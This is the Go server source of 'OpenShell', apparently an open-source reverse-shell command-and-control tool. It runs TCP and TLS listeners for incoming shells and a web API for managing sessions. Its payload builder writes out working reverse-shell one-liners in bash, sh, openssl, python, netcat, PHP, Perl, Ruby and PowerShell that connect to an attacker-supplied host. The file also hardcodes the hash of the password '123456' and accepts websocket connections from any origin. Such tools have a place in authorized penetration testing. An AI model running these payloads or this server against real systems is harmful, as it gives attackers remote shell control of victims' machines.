package main

import (
    "fmt"
    "os"
    "flag" //arguments
    "io"
    "net/http"
    "strconv"

    "crypto/sha256"
    "encoding/hex"
    "encoding/json"

    "openshell/internal/logger"

    "github.com/gorilla/websocket"
)

var banner = `
  ░██████                                      ░██████   ░██                   ░██ ░██ 
 ░██   ░██                                    ░██   ░██  ░██                   ░██ ░██ 
░██     ░██ ░████████   ░███████  ░████████  ░██         ░████████   ░███████  ░██ ░██ 
░██     ░██ ░██    ░██ ░██    ░██ ░██    ░██  ░████████  ░██    ░██ ░██    ░██ ░██ ░██ 
░██     ░██ ░██    ░██ ░█████████ ░██    ░██         ░██ ░██    ░██ ░█████████ ░██ ░██ 
 ░██   ░██  ░███   ░██ ░██        ░██    ░██  ░██   ░██  ░██    ░██ ░██        ░██ ░██ 
  ░██████   ░██░█████   ░███████  ░██    ░██   ░██████   ░██    ░██  ░███████  ░██ ░██ 
            ░██                                                                        
            ░██                                                                        
                                                        
`

var version = "1.0.0"
var author = "iss4cf0ng/ISSAC"
var repo = "https://github.com/iss4cf0ng/OpenShell"

var manager = NewSessionManager()
var upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
var passwordHash = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92" //123456

type LoginReq struct{ Password string `json:"password"` }

func loginHandler(w http.ResponseWriter,r *http.Request){
    if r.Method!="POST"{http.Error(w,"Method not allowed",405); return}
    body,_ := io.ReadAll(r.Body)
    var req LoginReq
    json.Unmarshal(body,&req)
    sum:=sha256.Sum256([]byte(req.Password))
    if hex.EncodeToString(sum[:])==passwordHash{
        w.WriteHeader(200)
        return
    }
    http.Error(w,"Wrong password",401)
}

//Build a reverse shell command.
func builderHandler(w http.ResponseWriter, r *http.Request) {

    lang := r.URL.Query().Get("lang")
    ip := r.URL.Query().Get("ip")
    port := r.URL.Query().Get("port")

    payload := ""

    switch lang {

    case "bash":
        payload = fmt.Sprintf(`bash -c 'exec 5<>/dev/tcp/%s/%s; script -qc /bin/bash /dev/null <&5 >&5 2>&5'`, ip, port)

    case "sh":
        payload = fmt.Sprintf(`sh -c 'exec 5<>/dev/tcp/%s/%s; script -qc /bin/sh /dev/null <&5 >&5 2>&5'`, ip, port)
    
    case "openssl":
        payload = fmt.Sprintf(`rm -f /tmp/s;mkfifo /tmp/s;script -qc /bin/bash /dev/null </tmp/s | openssl s_client -quiet -connect %s:%s >/tmp/s`, ip, port)

    case "python":
        payload = fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("%s",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, ip, port)

    case "nc":
        payload = fmt.Sprintf(`nc %s %s -e /bin/bash`, ip, port)

    case "php":
        payload = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s); exec("script -qc /bin/bash /dev/null <&3 >&3 2>&3");'`, ip, port)

    case "perl":
        payload = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`, ip, port)

    case "ruby":
        payload = fmt.Sprintf(`ruby -rsocket -e 'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/bash -i <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port)

    case "powershell":
        payload = fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`, ip, port)

    }

    w.Write([]byte(payload))
}

func statsHandler(w http.ResponseWriter,r *http.Request){
    json.NewEncoder(w).Encode(map[string]int{"online": manager.Count()})
}

func sessionsHandler(w http.ResponseWriter,r *http.Request){
    json.NewEncoder(w).Encode(manager.ListSessions())
}

func attachHandler(w http.ResponseWriter,r *http.Request){
    id := r.URL.Query().Get("id")
    conn, err := upgrader.Upgrade(w,r,nil)
    if err!=nil{return}
    s := manager.sessions[id]
    if s==nil{return}
    s.Conn = conn
    if s.Net!=nil{ go s.bridgeReverse() }
    if s.Pty!=nil{ go s.bridgePTY() }
}

func validatePort(port int) bool {
    return port > 0 && port <= 65535
}

func main(){
    fmt.Println(banner)

    port := flag.Int("port", 8080, "Web server port")
    port_tcp := flag.Int("port-tcp", 4444, "TCP listener port")
    port_tls := flag.Int("port-tls", 5555, "TLS listener port")

    showVersion := flag.Bool("version", false, "Show version info")

    flag.Usage = func() {
        fmt.Fprintf(os.Stderr, "Usage: %s [options]\n", os.Args[0])
        fmt.Println()
        fmt.Println("Options:")
        flag.PrintDefaults()
        fmt.Println()
        fmt.Println("Example:")
        fmt.Printf(" %s -port=8080 -port=8080 -port-tcp=4444 -port-tls=5555", os.Args[0])
    }

    flag.Parse()

    if *showVersion {
        logger.Info("Version: %s", version)
		logger.Info("Author: %s", author)
		logger.Info("GitHub: %s", repo)

        return
    }

    logger.Info("Validating port numbers...")
    if !validatePort(*port) {
        logger.Error("Invalid web port: %d (must be 1-65535)", *port)
        os.Exit(1)
    }

    if !validatePort(*port_tcp) {
        logger.Error("Invalid TCP port: %d (must be 1-65535)", *port_tcp)
        os.Exit(1)
    }

    if !validatePort(*port_tls) {
        logger.Error("Invalid TLS port: %d (must be 1-65535)", *port_tls)
        os.Exit(1)
    }
    
    logger.Info("Starting OpenShell server")
    logger.Info("Web UI: %d", *port)
    logger.Info("TCP listener: %d", *port_tcp)
    logger.Info("TLS listener: %d", *port_tls)

    go StartReverseShell(strconv.Itoa(*port_tcp))  //Normal TCP
    go StartTLSReverseShell(strconv.Itoa(*port_tls))       //TLS

    http.HandleFunc("/api/login",loginHandler)        //Login authentication

    http.HandleFunc("/api/builder",builderHandler)    //Payload builder
    http.HandleFunc("/api/stats",statsHandler)        //Show online machines
    http.HandleFunc("/api/sessions",sessionsHandler)  //Obtain sessions
    http.HandleFunc("/ws/session",attachHandler)      //Buffer handler

    fs := http.FileServer(http.Dir("../web"))
    http.Handle("/",fs)

    logger.Success("OpenShell server running on: %d", *port)

    err := http.ListenAndServe(":"+strconv.Itoa(*port), nil)
    if err != nil {
        logger.Error("HTTP server failed: %v", err)
    }
}